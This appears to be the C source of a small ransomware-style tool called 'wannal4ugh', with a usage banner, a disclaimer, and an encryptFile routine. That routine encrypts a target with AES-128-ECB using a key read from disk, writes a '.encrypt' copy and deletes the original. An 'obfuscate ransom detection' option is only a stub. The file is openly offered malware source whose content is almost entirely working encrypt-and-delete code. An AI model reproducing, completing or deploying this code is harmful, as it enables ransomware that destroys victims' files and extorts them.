#include "wannal4ugh.h"
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#define BUFSIZE 1024

/* Uncomment the next line for more verbose output */
// #define _DEBUG_

void printUsage()
{
	printf("Usage: wannalaugh  -[e <directory>]  -[o <number of files>]\n");
	printf("-e <directory>: Encrypts all files in the given directory\n");
	printf("-o <filename>: Obfuscates ransom detection by creating Y files in the given directory\n");
	printf("-v: Prints the current version.\n");
	printf("-h: Prints this help message\n");
}

void printVersion()
{
	printf("wannal4ugh: Version 1.0\n");
	printf("DISCLAIMER: You should ask for permission before using this tool.");
	printf(" Author shall not be held responsible for any illegal use of his tool.\n");
}

int main(int argc, char *argv[])
{
	int opt;

	while ((opt = getopt(argc, argv, "hve:o:")) != -1)
	{
		switch (opt)
		{
		case 'e':
			// printf("Ransom mode: target directory = %s\n", optarg);
			encryptFile(optarg);
			break;
		case 'o':
			printf("Obfuscate mode: number of files = %d\n", atoi(optarg));
			break;
		case 'v':
			printVersion();
			exit(EXIT_SUCCESS);
			break;
		case 'h':
			printUsage();
			exit(EXIT_SUCCESS);
			break;
		default:
			printUsage();
			exit(EXIT_FAILURE);
		}
	}
}

void encryptFile(char *filename)
{
	char buffer[BUFSIZE];

	unsigned char data[AES_BLOCK_SIZE];
	unsigned char encrypted_data[AES_BLOCK_SIZE];
	unsigned char *key = aes_read_key("aes_key.txt");
	// unsigned char *iv = (unsigned char *)"143278389942760";

	FILE *fd_src = fopen(filename, "r");
	if (fd_src == NULL)
		return;

#ifdef _DEBUG_
	printf("Opened source file: %s\n", filename);
#endif

	/* create and open a new file with suffix encrypt */
	sprintf(buffer, "%s.encrypt", filename);
	FILE *fd_dest = fopen(buffer, "w");

	if (fd_dest == NULL)
		return;

#ifdef _DEBUG_
	printf("Opened destination file: %s\n", buffer);
#endif

	/* read from input file, encrypt the data and then write the encrypted
	 * data to the output file
	 */
	int bytes;
	while ((bytes = fread(data, 1, AES_BLOCK_SIZE - 1, fd_src)) != 0)
	{

		int enc_bytes = aes_encrypt(data, bytes, key, NULL, encrypted_data, AES_128_ECB);
		int i = fwrite(encrypted_data, sizeof(unsigned char), enc_bytes, fd_dest);

#ifdef _DEBUG_
		printf("Read %d bytes:\n\"%s\"\n", bytes, data);
		printf("encoded bytes: %d\n", enc_bytes);
		printf("%d bytes written of total encrypted %d\n", i, AES_BLOCK_SIZE);
		printf("Encrypted Data written:\n");
		print_hex(encrypted_data, enc_bytes);
		printf("-------------------------------------\n");
#endif
		memset(data, 0, AES_BLOCK_SIZE);
		memset(encrypted_data, 0, AES_BLOCK_SIZE);
	}
	printf("Encryption Completed!\n");

	/* clean up */
	fclose(fd_src);
	fclose(fd_dest);
	free(key);
	remove(filename);
}
